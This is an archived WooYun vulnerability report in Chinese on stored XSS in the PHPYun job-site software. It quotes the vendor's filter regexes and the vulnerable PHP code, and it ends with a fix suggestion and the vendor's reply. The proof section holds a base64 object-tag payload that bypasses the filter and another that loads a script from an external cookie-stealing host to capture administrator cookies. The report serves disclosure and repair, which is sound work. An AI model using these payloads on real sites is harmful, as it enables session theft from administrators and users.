{"id": 49556, "wybug_id": "wooyun-2014-072869", "wybug_title": "Phpyun存储型xss14处可打后台cookie附带绕过和批量定位方法", "wybug_corp": "php云人才系统", "wybug_author": "zxx", "wybug_date": "2014-08-18 15:47", "wybug_open_date": "2014-11-16 15:48", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-16：\t细节向公众公开  简要描述： 20140811。绕过过滤，批量找xss，可打cookie。 详细说明：  刚开始做审计，phpyun的代码之前没有看过，phith0n曾经发过一个打包的xss，说是客户端过滤没有进行服务端过滤，现在这个版本应该是服务端过滤吧。phpyun的global.php里面引用了两个安全的php文件，分别是data/db.safety.php和include/webscan360/360safe/360webscan.php。先来看看data/db.safety.php：\nif($config['sy_istemplate']!='1' || md5(md5($config['sy_safekey']).$_GET['m'])!=$_POST['safekey']){\tforeach($_POST  as $id=>$v){\t\tsafesql($id,$v,\"POST\",$config);\t\t$id = sfkeyword($id,$config);\t\t$v = sfkeyword($v,$config);\t\t$_POST[$id]=common_htmlspecialchars($v);//\t}}foreach($_GET  as $id=>$v){\t\tsafesql($id,$v,\"GET\",$config);\t$id = sfkeyword($id,$config);\t$v = sfkeyword($v,$config);\tif(!is_array($v))\t$v=substr(strip_tags($v),0,80);\t$_GET[$id]=common_htmlspecialchars($v);//}foreach($_COOKIE  as $id=>$v){\t\tsafesql($id,$v,\"COOKIE\",$config);\t$id = sfkeyword($id,$config);\t$v = sfkeyword($v,$config);\t$v=substr(strip_tags($v),0,52);\t$_COOKIE[$id]=common_htmlspecialchars($v);//}\nsafesql函数先过滤一下，然后common_htmlspecialchars进行html编码。\nfunction safesql($StrFiltKey,$StrFiltValue,$type){\t\t $getfilter = \"\\\\<.+javascript:window\\\\[.{1}\\\\\\\\x|<.*=(&#\\\\d+?;?)+?>|<.*(data|src)=data:text\\\\/html.*>|\\\\b(alert\\\\(|confirm\\\\(|expression\\\\(|prompt\\\\(|benchmark\\s*?\\\\(\\d+?|sleep\\s*?\\\\([\\d\\.]+?\\\\)|load_file\\s*?\\\\()|<[a-z]+?\\\\b[^>]*?\\\\bon([a-z]{4,})\\s*?=|^\\\\+\\\\/v(8|9)|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|>|<|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.+?\\\\*\\\\/|\\\\/\\\\*\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT(\\\\(.+\\\\)|\\\\s+?.+?)|UPDATE(\\\\(.+\\\\)|\\\\s+?.+?)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?)FROM(\\\\(.+\\\\)|\\\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";\t$postfilter = \"<.*=(&#\\\\d+?;?)+?>|<.*data=data:text\\\\/html.*>|\\\\b(alert\\\\(|confirm\\\\(|expression\\\\(|prompt\\\\(|benchmark\\s*?\\\\(\\d+?|sleep\\s*?\\\\([\\d\\.]+?\\\\)|load_file\\s*?\\\\()|<[^>]*?\\\\b(onerror|onmousemove|onload|onclick|onmouseover)\\\\b|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|>|<|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.+?\\\\*\\\\/|\\\\/\\\\*\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT(\\\\(.+\\\\)|\\\\s+?.+?)|UPDATE(\\\\(.+\\\\)|\\\\s+?.+?)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?)FROM(\\\\(.+\\\\)|\\\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";\t$cookiefilter = \"benchmark\\s*?\\\\(\\d+?|sleep\\s*?\\\\([\\d\\.]+?\\\\)|load_file\\s*?\\\\(|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|>|<|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.+?\\\\*\\\\/|\\\\/\\\\*\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT(\\\\(.+\\\\)|\\\\s+?.+?)|UPDATE(\\\\(.+\\\\)|\\\\s+?.+?)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?)FROM(\\\\(.+\\\\)|\\\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";\n看看是不是有办法绕过，正则<.*data=data:text\\\\/html.*>，就绕过他吧，加个data=\"...\"，就绕过了。好，那我们用<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>就绕过了safesql，下一步要搞定html编码了。\nfunction common_htmlspecialchars($str){\t    $str = str_replace(    array('<','>','\"',\"'\",\"--\"),    array('&lt;','&gt;','&quot;',\"&acute;\",\"- -\"),    $str);  //先将一些字符替换    return gpc2sql($str);//这里带入一个简单的过滤函数，主要过滤sql，就不看了}\n从上面可以看出，我们全局的gpc数据都被这样处理了，那么直接插入数据库，肯定就是编码过的。关键来了，明确一下思路，搜索一下html_entity_decode函数，html解码之后insert或者update进数据库的基本上都能xss了。\n\n这里面后台的，就没有跟进去。除去后台的和插件的有，我按操作数据库的功能计算次数了。/friend/model/index.class.php 1处/ask/model/index.class.php 3处/member/model/com.class.php 7行/member/model/index.class.php 2行/model/ajax.class.php 1行先看/friend/model/index.class.php ，发表朋友圈状态时1处：\nfunction addstate_action()\t{\t\tinclude_once(CONFIG_PATH.\"db.data.php\");\t\tif($this->uid=='')\t\t{\t\t\t$this->obj->ACT_layer_msg(\"您还未登录或登录超时请重新登录！\",4,\"index.php\");\t\t}\t\tif($_POST['content'])\t\t{\t\t\t$content=$_POST['content'];\t\t\t$content = str_replace(\"&amp;\",\"&\",html_entity_decode($content,ENT_QUOTES,\"GB2312\"));//html解码\t\t\tforeach($arr_data['imface'] as $k=>$v)\t\t\t{\t\t\t\tif(strstr($content,\"[\".$k.\"]\"))\t\t\t\t{\t\t\t\t\t$content=str_replace(\"[\".$k.\"]\",\"<img src=\\\"\".$this->config[sy_weburl].$arr_data['faceurl'].$v.\"\\\">\",$content);\t\t\t\t}\t\t\t}\t\t\t$data['content']=$content;//放到$dara中\t\t\t$data['uid']=$this->uid;\t\t\t$data['ctime']=time();\t\t\tif($_FILES['msg_img']['name'])\t\t\t{\t\t\t\t$upload=$this->upload_pic(\"../upload/friend/\");\t\t\t\t$pictures=$upload->picture($_FILES['msg_img']);\t\t\t\t$data['msg_pic']=$pictures;\t\t\t}\t\t\t$cid = $this->obj->insert_into(\"friend_state\",$data);//$data被插入数据库\n/ask/model/index.class.php 中 追加问题和回答问题时各1处：\nfunction answer_action()\t{\t\t$gourl= $this->aurl(array(\"url\"=>\"c:content,id:\".$_GET['id']));\t\tif($_POST['content'])\t\t{\t\t\t$q_title=$this->obj->DB_select_once(\"question\",\"`id`='\".(int)$_GET['id'].\"'\",\"`uid`,`title`,`content`\");\t\t\tif($q_title['uid']==$this->uid)\t\t\t{\t\t\t\t$content = str_replace(\"&amp;\",\"&\",html_entity_decode(\"<br/>追加内容：<br/>\".$_POST['content'],ENT_QUOTES,\"GB2312\")); //解码\t\t\t\t$content=$q_title['content'].$content;\t\t\t\t$id=$this->obj->update_once(\"question\",array(\"content\"=>$content),array(\"id\"=>(int)$_GET['id'])); //更新入库\t\t\t\tif($id)\t\t\t\t{\t\t\t\t\t$this->obj->ACT_layer_msg( \"提问追加成功！\",9,$gourl);\t\t\t\t}else{\t\t\t\t\t$this->obj->ACT_layer_msg( \"提问追加失败！\",8,$gourl);\t\t\t\t}\t\t\t}else{\t\t\t\t$data['qid']=(int)$_GET['id'];\t\t\t\t$data['content']=str_replace(\"&amp;\",\"&\",html_entity_decode($_POST['content'],ENT_QUOTES,\"GB2312\"));//解码\t\t\t\t$data['uid']=$this->uid;\t\t\t\t$data['comment']=0;\t\t\t\t$data['support']=0;\t\t\t\t$data['oppose']=0;\t\t\t\t$data['add_time']=time();\t\t\t\t$id=$this->obj->insert_into(\"answer\",$data);//入库\t\t\t\tif($id)\t\t\t\t{\t\t\t\t\t$this->obj->DB_update_all(\"question\",\"`answer_num`=`answer_num`+1\",\"id='\".(int)$_GET['id'].\"'\");\t\t\t\t\t$state_content = \"回答了问答《<a href=\\\"\".$gourl.\"\\\" target=\\\"_blank\\\">\".$q_title['title'].\"</a>》。\";\t\t\t\t\t$this->addstate($state_content);\t\t\t\t\t$this->obj->ACT_layer_msg( \"回答成功！\", 9,$gourl);\t\t\t\t}else{\t\t\t\t\t$this->obj->ACT_layer_msg( \"回答失败！\", 8);\t\t\t\t}\t\t\t}\t\t}else{\t\t\t$this->obj->ACT_layer_msg( \"内容不能为空！\", 2);\t\t}\t}\n提问时1处:\nfunction save_action()\t{\t\tif($this->uid=='')\t\t{\t\t\t$this->obj->ACT_layer_msg( \"请先登录！\", 8);\t\t}\t\tif(trim($_POST['title'])==\"\")\t\t{\t\t\t$this->obj->ACT_layer_msg( \"标题不能为空！\", 8);\t\t}\t\t$data['title']=$_POST['title'];\t\t$data['cid']=(int)$_POST['cid'];\t\t$data['content']=str_replace(\"&amp;\",\"&\",html_entity_decode($_POST['content'],ENT_QUOTES,\"GB2312\"));//解码\t\t$data['uid']=$this->uid;\t\t$data['add_time']=time();\t\t$n_ids=$this->obj->insert_into(\"question\",$data); //入库 \t\tif($n_ids) \t\t{\t\t\t$nickname=$this->obj->DB_select_once(\"firend_info\",\"`uid`='\".$this->uid.\"'\",\"`nickname`\");\t\t\t$gourl= $this->aurl(array(\"url\"=>\"c:content,id:\".$n_ids));\t\t\t$sql['uid']=$this->uid;\t\t\t$sql['content']=\"发布了问答《<a href=\\\"\".$gourl.\"\\\" target=\\\"_blank\\\">\".$_POST['title'].\"</a>》。\";\t\t\t$sql['ctime']=time();\t\t\t$this->obj->insert_into(\"friend_state\",$sql);\t\t\t$gourl= $this->aurl(array(\"url\"=>\"c:index\"));\t\t\t$this->obj->ACT_layer_msg( \"提问成功！\",9,$gourl);\t\t}else{\t\t\t$this->obj->ACT_layer_msg( \"提问失败！\", 8);\t\t}\t}\n/member/model/com.class.php中 企业添加职位和更新职位各1处：\nfunction jobadd_action(){//215行\t\tif($_POST['submitBtn']){\t\t\t$id=intval($_POST['id']);\t\t\t$state= intval($_POST['state']);\t\t\tunset($_POST['submitBtn']);\t\t\tunset($_POST['id']);\t\t\tunset($_POST['state']);\t\t\t$_POST['uid']=$this->uid;\t\t\t$_POST['lastupdate']=time();\t\t\t$_POST['state']=$this->config['com_job_status'];\t\t\t$_POST['description'] = str_replace(array(\"&amp;\",\"background-color:#ffffff\",\"background-color:#fff\",\"white-space:nowrap;\"),array(\"&\",'background-color:','background-color:','white-space:'),html_entity_decode($_POST['description'],ENT_QUOTES,\"GB2312\"));解码。。。。\t\t\tif(!$id){\t\t\t\t$this->get_com(1);\t\t\t\t$nid=$this->obj->insert_into(\"company_job\",$_POST); //入库\t\t\t\t$name=\"添加职位\";  。。。\t\t\t}else{\t\t\t\tif($state==\"1\" || $state==\"2\")\t\t\t\t{\t\t\t\t\t$this->get_com(2);\t\t\t\t}\t\t\t\t$rows=$this->obj->DB_select_once(\"company_job\",\"`id`='\".$id.\"' and `uid`='\".$this->uid.\"'\");\t\t\t\t$nid=$this->obj->update_once(\"company_job\",$_POST,$where); //更新入库\t\t\t\t$name=\"更新职位\";}\n/member/model/com.class.php 修改企业资料1处：\nfunction info_action(){1619行\t\t\t$_POST['cert'] = $row['cert'];\t\t\t$where['uid']=$this->uid;\t\t\t$_POST['content'] = str_replace(array(\"&amp;\",\"background-color:#ffffff\",\"background-color:#fff\",\"white-space:nowrap;\"),array(\"&\",'background-color:','background-color:','white-space:'),html_entity_decode($_POST['content'],ENT_QUOTES,\"GB2312\"));//解码\t\t\t$_POST['lastupdate']=mktime();\t\t\t$nid=$this->obj->update_once(\"company\",$_POST,$where);//入库\n添加新闻和更改新闻各1处：\nfunction news_action(){2015行\t\tif($_POST['action']==\"save\")\t\t{\t\t\t$sql['title']=$_POST['title'];\t\t\t$body = str_replace(\"&amp;\",\"&\",html_entity_decode($_POST['body'],ENT_QUOTES,\"GB2312\"));//解码\t\t\t$title=trim($sql['title']);\t\t\tif($title==\"\" || $body==\"\")\t\t\t{ \t\t\t\t$this->obj->ACT_layer_msg(\"新闻标题内容不能为空！\",2,$_SERVER['HTTP_REFERER']);\t\t\t}\t\t\t$sql['body']=$body;\t\t\tif(!$_POST['id'])\t\t\t{\t\t\t\t$sql['uid']=$this->uid;\t\t\t\t$sql['ctime']=mktime();\t\t\t\t$oid=$this->obj->insert_into(\"company_news\",$sql);//入库\t\t\t}else{\t\t\t\t$where['uid']=$this->uid;\t\t\t\t$where['id']=(int)$_POST['id'];\t\t\t\t$sql['status']='0';\t\t\t\t$oid=$this->obj->update_once(\"company_news\",$sql,$where);//更新入库\t\t\t}}\n添加产品和更改产品各1处：\nfunction product_action(){2083行\t\tif($_POST['submit']){\t\t\t$sql['title']=$_POST['title'];\t\t\t$body = str_replace(\"&amp;\",\"&\",html_entity_decode($_POST['body'],ENT_QUOTES,\"GB2312\"));//解码\t\t\t$sql['body']=$body;//赋值\t\t\tif($_FILES['pic']['tmp_name'])\t\t\t{\t\t\t\t$upload=$this->upload_pic(\"../upload/product/\",false,$this->config['com_uppic']);\t\t\t\t$pictures=$upload->picture($_FILES['pic']);\t\t\t\t$this->picmsg($pictures,$_SERVER['HTTP_REFERER']);\t\t\t\t$sql['pic']=str_replace(\"../\",\"/\",$pictures);\t\t\t}\t\t\tif(!$_POST['id']){\t\t\t\t$sql['uid']=$this->uid;\t\t\t\t$sql['ctime']=mktime();\t\t\t\t$oid=$this->obj->insert_into(\"company_product\",$sql);//入库\t\t\t}else{\t\t\t\t$where['uid']=$this->uid;\t\t\t\t$where['id']=(int)$_POST['id'];\t\t\t\t$sql['status']=0;\t\t\t\tif($_FILES['pic']['tmp_name']){\t\t\t\t\t$pictures=$upload->picture($_FILES['pic']);\t\t\t\t\t$this->picmsg($pictures,$_SERVER['HTTP_REFERER']);\t\t\t\t\t$sql['pic']=str_replace(\"../\",\"/\",$pictures);\t\t\t\t\t$row=$this->obj->DB_select_once(\"company_product\",\"`id`='\".(int)$_POST['id'].\"' and `uid`='\".$this->uid.\"'\",\"pic\");\t\t\t\t\tif(is_array($row)){\t\t\t\t\t\t$this->obj->unlink_pic(\"..\".$row['pic']);\t\t\t\t\t}\t\t\t\t}\t\t\t\t$oid=$this->obj->update_once(\"company_product\",$sql,$where);//更新入库\t\t\t} \t\t\t$oid?$this->obj->ACT_layer_msg(\"操作成功！\",9,\"index.php?c=product\"):$this->obj->ACT_layer_msg(\"操作失败，请稍后再试！\",8,\"index.php?c=product\");\t\t}}\n/member/model/index.class.php中 个人添加黏贴简历和更改黏贴简历各1处\nfunction expectq_action(){\t\t$this->get_user();\t\t$num=$this->obj->DB_select_num(\"resume_expect\",\"`uid`='\".$this->uid.\"'\");\t\tif($_POST['submit']){\t\t\t$eid=(int)$_POST['eid'];\t\t\t$data['doc']=str_replace(\"&amp;\",\"&\",html_entity_decode($_POST['doc'],ENT_QUOTES,\"GB2312\"));//解码\t\t\t$_POST['lastupdate']=mktime();\t\t\tunset($_POST['eid']);\t\t\tunset($_POST['submit']);\t\t\tunset($_POST['doc']);\t\t\tif(!$eid){\t\t\t\tif($num>=$this->config['user_number'])\t\t\t\t{\t\t\t\t\t$this->obj->ACT_layer_msg(\"你的简历数已经超过系统设置的简历数了\",8,\"index.php?c=resume\");\t\t\t\t}\t\t\t\t$_POST['doc']='1';\t\t\t\t$_POST['uid']=(int)$this->uid;\t\t\t\t$nid=$this->obj->insert_into(\"resume_expect\",$_POST);\t\t\t\t$data['eid']=(int)$nid;\t\t\t\t$data['uid']=(int)$this->uid;\t\t\t\t$nid2=$this->obj->insert_into(\"resume_doc\",$data);//入库\t\t\t\tif($nid2){\t\t\t\t\tif($num==0){\t\t\t\t\t\t$this->obj->update_once('resume',array('def_job'=>$nid),array('uid'=>$this->uid)); \t\t\t\t\t}\t\t\t\t\t$nid2=$this->obj->DB_update_all(\"member_statis\",\"`resume_num`=`resume_num`+1\",\"uid='\".$this->uid.\"'\");\t\t\t\t}\t\t\t\t$nid2?$this->obj->ACT_layer_msg(\"添加成功！\",9,\"index.php?c=resume\"):$this->obj->ACT_layer_msg(\"添加失败！\",8,\"index.php?c=resume\");\t\t\t}else{\t\t\t\t$_POST['height_status']='0';\t\t\t\t$this->obj->update_once(\"resume_expect\",$_POST,array(\"id\"=>$eid));\t\t\t\t$nid=$this->obj->update_once(\"resume_doc\",$data,array(\"eid\"=>$eid));//更新入库 \t\t\t\t$nid?$this->obj->ACT_layer_msg(\"更新成功！\",9,\"index.php?c=resume\"):$this->obj->ACT_layer_msg(\"更新失败！\",8,\"index.php?c=resume\");\t\t\t}\t\t}\n/model/ajax.class.php中 使用ajax添加朋友圈1处：\nfunction mystate_action()\t{\t\tinclude_once(CONFIG_PATH.\"db.data.php\");\t\tif($this->uid>0)\t\t{\t\t\tif($_POST['content'])\t\t\t{\t\t\t\t$content = str_replace(\"&amp;\",\"&\",html_entity_decode($_POST['content'],ENT_QUOTES,\"GB2312\"));//解码\t\t\t\t$content = iconv(\"utf-8\", \"gbk\",$content);\t\t\t\tforeach($arr_data['imface'] as $k=>$v)\t\t\t\t{\t\t\t\t\tif(strstr($content,\"[\".$k.\"]\"))\t\t\t\t\t{\t\t\t\t\t\t$content=str_replace(\"[\".$k.\"]\",\"<img src=\\\"\".$this->config['sy_weburl'].$arr_data['faceurl'].$v.\"\\\">\",$content);\t\t\t\t\t}\t\t\t\t}\t\t\t\t$data['content']=$content;\t\t\t\t$data['uid']=$this->uid;\t\t\t\t$data['ctime']=time();\t\t\t\t$cid = $this->obj->insert_into(\"friend_state\",$data);//入库\t\t\t\t$info = $this->obj->DB_select_once(\"friend_info\",\"uid='\".$this->uid.\"'\");\t\t\t\tif($info['pic']==\"\")\t\t\t\t{\t\t\t\t\t$info['pic'] = $this->config['sy_weburl'].\"/\".$this->config['sy_friend_icon'];\t\t\t\t}\t\t\t\t$info['url'] = $this->furl(array(\"url\"=>\"c:profile,id:\".$this->uid));\t\t\t\t$info['ctime']=date(\"Y-m-d H:i\");\t\t\t\t$info['cid'] = $cid;\t\t\t\t$info['content'] = $content;\t\t\t\t$info['nickname'] = iconv(\"gbk\", \"utf-8\",$info['nickname']);\t\t\t\techo urldecode(json_encode($info));die;\t\t\t}\t\t}else{\t\t\techo 1;die;\t\t}\t}\n   漏洞证明：  先来看看危害吧，拿朋友圈这个做个测试，因为朋友圈比较直接，管理员点朋友圈，直接可以可以插，招聘信息和新闻那些，管理员也一定会被x到，因为那些内容必须审核。这些xss几乎覆盖了所以地方，想x用户x企业x管理都可以，成功率很高，如果配合csrf getshell，效果更好。现在已经可以用来打cookie。先测试弹窗吧。<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgvenh4Lyk8L3NjcmlwdD4=\"></object>用comtest，是个用户，发了一条朋友圈：\n\n\n\n管理员在后台点到朋友圈的时候，直接弹窗：\n\n试试打cookie吧：<object data=\"data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3hzcy5yZS81Nzg0Pjwvc2NyaXB0Pg==\"></object>\n\n看看cookie：\n\n接下来试试各种弹窗吧。查看职位：\n\n看下提问和追加提问：\n\n\n\n企业的介绍、新闻和产品：\n\n\n\n\n\n黏贴简历，注意是黏贴简历和修改简历不一样:提交地址http://localhost/member/index.php?c=expectq\n\n\n\najax那个和朋友圈提交效果一样,只是提交方法不一样：不测试了   修复方案：  主要还是过滤，另外，不需要富文本的地方，朋友圈什么的，直接不要解码了，需要用的地方好好过滤一下。   版权声明：转载请注明来源 zxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-08-18 16:00 厂商回复： 感谢您的提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-18 15:58 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  洞主放心，这个厂商肯定忽略    \n     2014-08-18 16:02 |    \t\t蓝冰 \t\t\t( 核心白帽子 |\t\t\t        Rank:627 漏洞数:50        | -.-)\t\t \n  @贫道来自河北 = =! 秒确认    \n     2014-11-16 17:15 |    \t\t鬼五 \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:83        )\t\t \n  大牛球教代码审计    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}